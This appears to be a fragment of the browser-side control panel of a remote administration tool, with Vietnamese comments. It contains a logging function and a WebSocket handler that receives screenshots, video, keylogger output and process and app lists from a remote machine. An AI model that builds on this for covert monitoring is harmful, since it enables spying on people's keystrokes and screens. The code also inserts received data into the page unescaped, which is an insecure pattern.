...
// --- HÀM GHI LOG ĐÃ CHỈNH SỬA ---
// Thêm tham số 'type' mặc định là 'GENERAL'
function log(msg, isHighlight = false, type = "GENERAL") {
    const time = new Date().toLocaleTimeString();
    const colorStyle = isHighlight ? "color: #ffffffff;" : "color: #ddd;";
    
    const line = `<div style="border-bottom:1px dashed #444; margin-bottom:5px; padding-bottom: 2px;">
                    <span style="color: #aaa; font-size: 0.8em;">[${time}]</span> 
                    <span style="${colorStyle}">${msg}</span>
                  </div>`;
    
    const listAppBox = document.getElementById("listAppLogBox");
    const processBox = document.getElementById("processLogBox");
    const adminBox = document.getElementById("adminLogBox"); // Box ở màn hình Connect
    const adminBoxAfterConnected = document.getElementById("adminLogBoxAfterConnected"); // Box ở Dashboard

    // 1. Xử lý log cho APP
    if (type === "APP" && listAppBox) {
        listAppBox.insertAdjacentHTML('afterbegin', line);
        return; 
    }

    // 2. Xử lý log cho PROCESS
    if (type === "PROC" && processBox) {
        processBox.insertAdjacentHTML('afterbegin', line);
        return;
    }

    // 3. Xử lý log GENERAL (Các tin còn lại)
    // Logic: Nếu đã vào Dashboard (adminBoxAfterConnected hiển thị) thì ghi vào đó
    // Nếu chưa (đang ở màn hình Connect) thì ghi vào adminBox
    if (adminBoxAfterConnected && adminBoxAfterConnected.offsetParent !== null) {
        adminBoxAfterConnected.insertAdjacentHTML('afterbegin', line);
    } else if (adminBox) {
        adminBox.insertAdjacentHTML('afterbegin', line);
    }
}
...
function connectToWebSocket(ip) {
    ...
    try {
        ...
        // 2. NHẬN TIN NHẮN TỪ SERVER (ĐÃ SỬA PHÂN LOẠI LOG)
        socket.onmessage = (event) => {
            const msg = event.data;
            
            // 2.1. Xử lý Video File
            if (msg.startsWith("VIDEO_DATA:")) {
                log("🎥 Nhận video file! Đang tải...", true); // Mặc định vào Admin Log
                downloadVideo(msg.replace("VIDEO_DATA:", ""));
            } 
            // 2.2. Xử lý Ảnh Screenshot
            else if (msg.startsWith("IMG_BASE64:")) {
                log("🖼️ Nhận ảnh screenshot! Mở cửa sổ xem trực tiếp...", true); // Mặc định vào Admin Log
                const base64Img = msg.replace("IMG_BASE64:", "");
                openLiveMonitor(base64Img);
            } 
            // 2.3. Xử lý Keylog Data
            else if (msg.startsWith("KEYLOG_DATA:")) {
                log("⌨️ Keylog data: <br>" + msg.replace("KEYLOG_DATA:", ""), true); // Mặc định vào Admin Log
            } 
            // 2.4. Xử lý Process List -> Gửi vào PROC box
            else if (msg.startsWith("LIST_PROC:")) {
                const content = msg.replace("LIST_PROC:", "").replace(/\n/g, "<br>");
                const htmlContent = "📄 Process List:<br><div style='max-height:200px; overflow-y:auto; font-size:0.8em;'>" + content + "</div>";
                // Tham số thứ 3 là "PROC" để định tuyến
                log(htmlContent, true, "PROC"); 
            } 
            // 2.5. Xử lý App List -> Gửi vào APP box
            else if (msg.startsWith("LIST_APP:")) {
                const content = msg.replace("LIST_APP:", "").replace(/\n/g, "<br>");
                const htmlContent = "📄 App List:<br><div style='max-height:200px; overflow-y:auto; font-size:0.8em;'>" + content + "</div>";
                // Tham số thứ 3 là "APP" để định tuyến
                log(htmlContent, true, "APP");
            }
            // 2.6. Tin nhắn thường
            else {
                log("📥 " + msg, true); // Mặc định vào Admin Log
            }
        };
